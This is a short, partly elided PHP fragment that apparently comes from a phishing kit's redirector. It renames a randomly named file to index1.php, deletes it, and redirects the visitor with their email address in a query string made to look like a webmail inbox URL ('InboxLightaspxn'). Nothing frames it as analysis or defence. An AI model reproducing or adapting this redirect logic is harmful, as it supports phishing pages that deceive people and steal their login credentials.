...
if ($handle = opendir($dir)) {
 ...
 $len = strlen($entry);
if($len == 28){
rename($entry, "index1.php");
}}}
$staticfile = "index1.php";
...
//echo "file exist\n";
unlink($staticfile);
header("Location: $secfile?rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&email=$email&fav.1&rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&fav.1&");
}}
